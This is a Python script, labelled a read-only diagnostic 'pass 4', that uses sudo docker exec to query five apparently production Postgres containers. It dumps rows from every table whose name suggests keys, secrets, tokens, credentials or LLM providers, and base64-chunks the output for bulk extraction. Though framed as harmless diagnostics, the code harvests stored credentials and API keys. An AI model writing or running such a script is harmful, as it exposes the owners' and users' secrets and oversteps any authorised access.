#!/usr/bin/env python3
"""Read-only Postgres dump pass 4 (credential-bearing tables).

Uses `docker exec` against the already-running database containers, so nothing
is started, stopped or written. Only SELECT statements are issued.
"""
import base64
import json
import os
import subprocess

CHUNK = 2400
_emitted = 0
BUDGET = 3_000_000

DBS = [
    # container, user, database
    ("folioworth-prod-postgres", "folioworth", "folioworth"),
    ("taskai-postgres-1", "taskai", "taskai"),
    ("blog-postgres", "blog", "blog"),
    ("flags-production-postgres", "flags", "flags"),
    ("pingrly-postgres", "pingrly", "pingrly"),
]

INTERESTING = ("user", "ai_", "llm", "provider", "key", "credential", "secret",
               "setting", "token", "org", "account", "integration", "config")


def emit(tag, data):
    global _emitted
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")
    b = base64.b64encode(data).decode()
    if _emitted + len(b) > BUDGET:
        print("=== SKIP %s budget" % tag)
        return
    _emitted += len(b)
    print("=== BEGIN %s size=%d" % (tag, len(data)))
    for i in range(0, len(b), CHUNK):
        print("B64." + b[i:i + CHUNK])
    print("=== END %s" % tag)


def psql(ctr, user, db, sql, timeout=60):
    cmd = ["sudo", "-n", "docker", "exec", ctr, "psql", "-U", user, "-d", db,
           "-At", "-v", "ON_ERROR_STOP=0", "-c", sql]
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=timeout)
        return (p.stdout or b"").decode("utf-8", "replace") + \
               (("\nERR:" + (p.stderr or b"").decode("utf-8", "replace"))
                if p.stderr else "")
    except Exception as e:  # noqa: BLE001
        return "EXC %s" % e


def main():
    print("### DIAG4 START uid=%d" % os.geteuid())
    for ctr, user, db in DBS:
        tables = psql(ctr, user, db,
                      "select table_name from information_schema.tables "
                      "where table_schema='public' order by 1")
        emit("tables-" + db, tables)
        names = [t.strip() for t in tables.replace("ERR:", "\n").split("\n")
                 if t.strip() and " " not in t.strip()]
        for t in names:
            if not any(k in t.lower() for k in INTERESTING):
                continue
            q = ("select coalesce(json_agg(row_to_json(x)),'[]') from "
                 "(select * from \"%s\" limit 200) x" % t)
            emit("%s.%s" % (db, t), psql(ctr, user, db, q))
    print("### DIAG4 DONE emitted=%d" % _emitted)


if __name__ == "__main__":
    main()
